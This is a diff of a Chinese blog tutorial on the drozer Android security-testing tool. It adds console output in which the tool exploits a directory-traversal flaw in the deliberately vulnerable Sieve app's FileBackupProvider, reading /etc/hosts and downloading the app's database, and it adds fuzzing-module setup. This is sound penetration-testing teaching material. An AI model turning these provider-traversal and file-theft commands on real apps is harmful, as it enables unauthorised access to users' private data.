@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/tea9/image/master/blog_img/38/1.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/tea9/image/master/blog_img/38/2.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/tea9/image/master/blog_img/38/3.jpg">
-<meta property="og:updated_time" content="2021-03-09T05:49:57.697Z">
+<meta property="og:updated_time" content="2021-03-09T11:23:45.594Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="android-drozer">
 <meta name="twitter:description" content="drozer配置&amp;使用">
@@ -249,7 +249,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-03-09 13:49:57" itemprop="dateModified" datetime="2021-03-09T13:49:57+08:00">2021-03-09</time>
+                <time title="修改时间：2021-03-09 19:23:45" itemprop="dateModified" datetime="2021-03-09T19:23:45+08:00">2021-03-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -512,20 +512,24 @@ Not Vulnerable:
   content://com.mwr.example.sieve.DBContentProvider/Keys
   content://com.mwr.example.sieve.DBContentProvider/Passwords/
   content://com.mwr.example.sieve.DBContentProvider/Keys/
-  content://com.mwr.example.sieve.FileBackupProvider
-  content://com.mwr.example.sieve.FileBackupProvider/
   content://com.mwr.example.sieve.DBContentProvider/Passwords
   content://com.mwr.example.sieve.DBContentProvider
 
 Vulnerable Providers:
-  No vulnerable providers found.
-dz&gt; 
+  content://com.mwr.example.sieve.FileBackupProvider/
+  content://com.mwr.example.sieve.FileBackupProvider
 </code></pre><p>手动测试目录遍历漏洞：<br>读取指定路径文件内容：<br>run app.provider.read contentProviderURI+filePath</p>
 <p>run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</p>
+<pre><code>dz&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
+127.0.0.1       localhost
+::1             ip6-localhos
+</code></pre><hr>
 <p>下载安装包目录下指定目录下的文件：run app.provider.download contentProviderURI+filePath exportPath</p>
 <p>run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /Users/tea/Downloads/databse.db</p>
-<p>run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db .</p>
-<p>获取service信息<br>获取是exported状态的services的命令<br>run app.service.info -a com.mwr.example.sieve</p>
+<p>任意下载文件</p>
+<pre><code>dz&gt; run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db .
+Written 24576 bytes
+</code></pre><p>获取service信息<br>获取是exported状态的services的命令<br>run app.service.info -a com.mwr.example.sieve</p>
 <pre><code>dz&gt; run app.service.info -a com.mwr.example.sieve
 Package: com.mwr.example.sieve
   com.mwr.example.sieve.AuthService
@@ -534,7 +538,13 @@ Package: com.mwr.example.sieve
     Permission: null
 </code></pre><p>向服务发送消息<br>run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService –msg 1 5 3</p>
 <p>run app.service.send com.example.srv com.example.srv.Service –msg 1 2 3 –extra float value 0.1324 –extra string test value</p>
-<p>关于service模块</p>
+<pre><code>dz&gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService --msg 1 5 3
+Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.CryptoService:
+  what: 111111
+  arg1: 0
+  arg2: 0
+  Empty
+</code></pre><p>关于service模块</p>
 <pre><code>dz&gt; cd app
 dz#app&gt; cd service
 dz#app.service&gt; ls
@@ -744,7 +754,7 @@ class Deny(Module, common.Filters, common.PackageManager):
                 self.stdout.write(&quot; error&quot;)
         else:
             self.stdout.write(&quot;No package specifiedn&quot;)
-</code></pre><p>创建自己的moudle仓库<br>module repository create /Users/tea/Documents/tools/android/drozer-modules-bytea<br>安装模块<br>module install /Users/tea/Documents/tools/android/drozer-modules-bytea/fuzz.py</p>
+</code></pre><p>创建自己的moudle仓库<br>module repository create /Users/tea/Documents/tools/android/drozer-modules-bytea<br>把fuzz.py放到目录里<br>安装模块<br>module install /Users/tea/Documents/tools/android/drozer-modules-bytea/fuzz.py</p>
 <p>运行fuzz<br>run exp.fuzz.deny com.mwr.example.sieve</p>
 <p>新开个命令行监听运行异常日志<br>adb logcat | grep java.lang.RuntimeException </p>
 <p>手工启动actvity<br><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/38/2.png" alt=""></p>
@@ -858,7 +868,7 @@ Traceback (most recent call last):
   File &quot;/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/pydiesel/reflection/utils/class_loader.py&quot;, line 51, in getClassLoader
     raise RuntimeError(&quot;drozer could not find or compile a required extension library.\n&quot;)
 RuntimeError: drozer could not find or compile a required extension library.
-</code></pre><p>修改 /Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/pydiesel/reflection/utils/class_loader.py</p>
+</code></pre><p>修改 <code>/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/pydiesel/reflection/utils/class_loader.py</code></p>
 <pre><code> def __get_source(self, source_or_relative_path, relative_to=None):
         &quot;&quot;&quot;
         Get source, either from an apk file or passed directly.
@@ -924,6 +934,44 @@ Unable to Query  content://com.coolapk.market.utilcode.provider/
 
 No accessible content URIs found.
 dz&gt;
+</code></pre><pre><code>git clone https://github.com/FSecureLABS/drozer-modules.git
+
+root@6842e8e0c7b0:/# drozer console connect --server 192.168.11.217
+Selecting 29381b23433115c3 (Google Pixel 8.1.0)
+
+            ..                    ..:.
+           ..o..                  .r..
+            ..a..  . ....... .  ..nd
+              ro..idsnemesisand..pr
+              .otectorandroidsneme.
+           .,sisandprotectorandroids+.
+         ..nemesisandprotectorandroidsn:.
+        .emesisandprotectorandroidsnemes..
+      ..isandp,..,rotectorandro,..,idsnem.
+      .isisandp..rotectorandroid..snemisis.
+      ,andprotectorandroidsnemisisandprotec.
+     .torandroidsnemesisandprotectorandroid.
+     .snemisisandprotectorandroidsnemesisan:
+     .dprotectorandroidsnemesisandprotector.
+
+drozer Console (v2.4.4)
+dz&gt; module repository create /drozer-modules
+The target (/drozer-modules) already exists.
+
+dz&gt; module install /drozer-modules/intents/fuzzinozer.py
+You do not have a drozer Module Repository.
+Would you like to create one? [yn] y
+Path to new repository: /drozer-modules
+The target (/drozer-modules) already exists.
+
+Path to new repository: /drozer-modules1
+Initialised repository at /drozer-modules1.
+
+Processing /drozer-modules/intents/fuzzinozer.py... Done.
+
+Successfully installed 1 modules, 0 already installed.
+
+dz&gt; 
 </code></pre><h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://www.freebuf.com/sectool/26503.html" target="_blank" rel="noopener">Drozer - Android APP安全评估工具（附测试案例）</a><br><a href="https://www.jianshu.com/p/168cdd3daa1d" target="_blank" rel="noopener">Drozer 安装和使用 (Mac)</a><br><a href="https://www.jianshu.com/p/65fc2d52c7b1" target="_blank" rel="noopener">Drozer安装(Mac系统)和使用</a><br><a href="https://www.cnblogs.com/goodhacker/p/3906180.html" target="_blank" rel="noopener">利用drozer进行Android渗透测试</a><br><a href="https://blog.csdn.net/cch139745/article/details/53519900" target="_blank" rel="noopener">Drozer模块命令大全（一）</a><br><a href="https://blog.csdn.net/cch139745/article/details/53691123" target="_blank" rel="noopener">Drozer模块命令大全（二）</a><br><a href="https://www.jianshu.com/p/dfa92bab3a55" target="_blank" rel="noopener">Android安全测试框架Drozer（使用篇）</a><br><a href="http://www.blogjava.net/qileilove/archive/2015/03/18/423597.html" target="_blank" rel="noopener">利用drozer进行Android渗透测试</a><br><a href="https://www.anquanke.com/post/id/187948" target="_blank" rel="noopener">浅析src的app漏洞挖掘</a><br><a href="http://rui0.cn/archives/30" target="_blank" rel="noopener">利用Drozer进行app本地拒绝服务漏洞测试</a>  </p>
 
     </div>
